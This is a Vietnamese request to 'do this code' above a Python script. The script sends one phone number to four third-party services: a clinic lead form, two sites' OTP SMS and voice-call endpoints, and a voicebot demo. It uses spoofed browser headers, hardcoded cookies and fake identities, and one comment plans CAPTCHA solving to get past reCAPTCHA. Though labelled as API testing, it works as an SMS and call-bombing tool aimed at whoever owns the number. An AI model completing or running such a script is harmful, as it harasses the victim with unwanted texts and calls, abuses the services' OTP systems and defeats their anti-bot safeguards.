làm code này á mport requests
import random
import string
import time
import sys
from urllib.parse import urlencode


# ───────────────────────────────────────────────
# UTILS
# ───────────────────────────────────────────────

def generate_request_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=20))


# ───────────────────────────────────────────────
# 1. UUDAI - Seoul Center
# ───────────────────────────────────────────────

def uudai(phone):
    NAME = "Trần tuấn"
    PRODUCTS = "Thẩm Mỹ Mắt"
    CART_QUANTITY = 0
    BASE_URL = "https://uudai.seoulcenter.com.vn/cam-on-quy-khach"

    params = {
        "name": NAME,
        "phone": phone,
        "products": PRODUCTS,
        "cart_quantity": CART_QUANTITY,
    }
    full_url = BASE_URL + "?" + urlencode(params)

    common_headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "Origin": "https://uudai.seoulcenter.com.vn",
        "Referer": full_url,
    }

    session = requests.Session()
    session.headers.update(common_headers)

    print(f"[INFO] URL: {full_url}")

    # Step 1: LadiPage PageView
    try:
        ladipage_payload = {
            "event": "PageView",
            "store_id": "5977f59d1abc544991d43c5b",
            "time_zone": 7,
            "domain": "uudai.seoulcenter.com.vn",
            "url": full_url,
            "ladipage_id": "6985595d7beb82001297bf6c",
            "publish_platform": "LADIPAGEDNS",
            "data": [],
            "tracking_page": True,
        }
        r1 = session.post(
            "https://a.ladipage.com/event",
            json=ladipage_payload,
            headers={
                "Content-Type": "application/json",
                "LADI_CLIENT_ID": "d2d19e70-fbbc-4a64-6f3d-258daa7593b4",
                "LADI_PAGE_VIEW": "1",
            },
            timeout=15,
        )
        print(f"[LadiPage] {r1.status_code} - {r1.text[:200]}")
    except Exception as e:
        print(f"[LadiPage] Lỗi: {e}")

    # Step 2: Tawk.to session
    try:
        tawk_payload = {
            "p": "654305cff2439e1631ead981",
            "w": "1he6std03",
            "platform": "mobile",
            "tzo": -420,
            "url": full_url,
            "referrer": "https://uudai.seoulcenter.com.vn/",
            "vss": "",
            "consent": False,
            "wss": "min",
            "u": "1.bK3a9QXmr8LLTsB5J985VoRXkrMk22YoCGO8590JunOTsHazaGmRfByzNZNtwWyCgZSFAnRW5BLDvEadDWbrUFLpPxAJnXQWRBnSNUxOQDfBvTPD4RBITaxyuhSQx",
            "uv": 3,
        }
        r2 = session.post(
            "https://va.tawk.to/v1/session/start",
            json=tawk_payload,
            headers={"Content-Type": "application/json; charset=utf-8"},
            timeout=15,
        )
        print(f"[Tawk.to] {r2.status_code}")
    except Exception as e:
        print(f"[Tawk.to] Lỗi: {e}")

    # Step 3: GET trang xác nhận
    try:
        r3 = session.get(
            full_url,
            headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
            timeout=15,
        )
        print(f"[Xác nhận] {r3.status_code}")
        return {"success": r3.status_code == 200, "status_code": r3.status_code}
    except Exception as e:
        print(f"[Xác nhận] Lỗi: {e}")
        return {"success": False, "status_code": 0}


# ───────────────────────────────────────────────
# 2. VAYXANH
# ───────────────────────────────────────────────

def debug_request(phone):
    cookies = {
        "__sbref": "hgpyjywadlykgkoiavkyouqetxuxcpwhpxdqandf",
        "_cabinet_key": "SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDkxNDkwMTk2Ng.nD_8NLs-CZ7IqIV4JqSpmnAsPVAC0r0WuzMgua9OO1U",
    }

    headers_get = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "referer": "https://vayxanh.com/",
    }

    x_request_id = generate_request_id()
    headers_post = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json;charset=utf-8",
        "origin": "https://lk.vayxanh.com",
        "referer": f"https://lk.vayxanh.com/?phone={phone}&amount=2000000&term=7",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "x-request-id": x_request_id,
    }

    try:
        params = {
            "phone": phone,
            "amount": "2000000",
            "term": "7",
            "utm_source": "direct_vayxanh",
            "utm_medium": "organic",
            "utm_campaign": "direct_vayxanh",
            "utm_content": "mainpage_submit",
        }

        response_get = requests.get(
            "https://lk.vayxanh.com/",
            params=params,
            cookies=cookies,
            headers=headers_get,
            timeout=15,
        )
        cookies.update(response_get.cookies.get_dict())

        json_data = {
            "data": {
                "phone": phone,
                "code": "resend",
                "channel": "ivr",
            }
        }

        response_post = requests.post(
            "https://lk.vayxanh.com/api/4/client/otp/send",
            cookies=cookies,
            headers=headers_post,
            json=json_data,
            timeout=15,
        )

        print(f"[VayXanh] {response_post.status_code} - {response_post.text[:200]}")
        return {"success": response_post.status_code == 200, "status_code": response_post.status_code}

    except Exception as e:
        print(f"[VayXanh] Lỗi: {e}")
        return {"success": False, "status_code": 0}


# ───────────────────────────────────────────────
# 3. VUIHOC
# ───────────────────────────────────────────────

def vuihoc(phone):
    url = "https://vuihoc.vn/service/security/sendOTPSMS"

    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    }

    # recaptcha_token hết hạn nhanh, cần lấy token mới mỗi lần
    # Tạm thời để trống, cần dùng capsolver để tự động lấy
    data = {
        "type": "1",
        "phone": phone,
        "recaptcha_token": "",  # TODO: cần generate token mới mỗi lần
    }

    try:
        response = requests.post(url, headers=headers, data=data, timeout=15)
        print(f"[Vuihoc] {response.status_code} - {response.text[:200]}")
        return {"success": response.status_code == 200, "status_code": response.status_code}
    except Exception as e:
        print(f"[Vuihoc] Lỗi: {e}")
        return {"success": False, "status_code": 0}


# ───────────────────────────────────────────────
# 4. EMANDAI - VNLP Voicebot Demo
# ───────────────────────────────────────────────

def emandai(phone):
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/json; charset=UTF-8",
        "Cache-Control": "no-cache",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "Cookie": (
            "_fbp=fb.1.1772012386568.817370106914909167; "
            "_ga=GA1.2.818066943.1772012386; "
            "_gid=GA1.2.1454547666.177201238; "
            "pll_language=vi; "
        ),
    }

    data = {
        "name": "Hoàng Trọng",
        "phoneNumber": phone,
        "email": "cotenhp2888@gmail.com",
        "company": "HiCash",
        "department": "Thẩm định",
        "url": "https://emandai.net/vi/",
        "botTemplate": "underwriting",
    }

    try:
        response = requests.post(
            "https://marketingapis.vnlp.ai/calls/tracking-data-demo?sheetName=Demo_Voicebot",
            headers=headers,
            json=data,
            timeout=15,
        )
        print(f"[Emandai] {response.status_code} - {response.text[:200]}")
        return {"success": response.status_code == 200, "status_code": response.status_code}
    except Exception as e:
        print(f"[Emandai] Lỗi: {e}")
        return {"success": False, "status_code": 0}


# ───────────────────────────────────────────────
# RUN ALL
# ───────────────────────────────────────────────

def run_tests(phone):
    print("\n" + "=" * 60)
    print(f"🧪 TESTING APIs | 📱 Phone: {phone}")
    print("=" * 60 + "\n")

    print("1️⃣  UUDAI (Seoul Center)...")
    result1 = uudai(phone)
    print()

    print("2️⃣  VAYXANH...")
    result2 = debug_request(phone)
    print()

    print("3️⃣  VUIHOC...")
    result3 = vuihoc(phone)
    print()

    print("4️⃣  EMANDAI (VNLP Voicebot)...")
    result4 = emandai(phone)
    print()

    print("=" * 60)
    results = [result1, result2, result3, result4]
    names = ["UUDAI", "VAYXANH", "VUIHOC", "EMANDAI"]
    print("📊 KẾT QUẢ:")
    for name, result in zip(names, results):
        status = "✅" if result.get("success") else "❌"
        print(f"   {status} {name}: HTTP {result.get('status_code', 'Error')}")
    print("=" * 60)
    return results


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Cách dùng: python nat1.py <số_điện_thoại>")
        print("Ví dụ:     python nat1.py 0912345678")
        sys.exit(1)

    phone_number = sys.argv[1]
    run_tests(phone_number)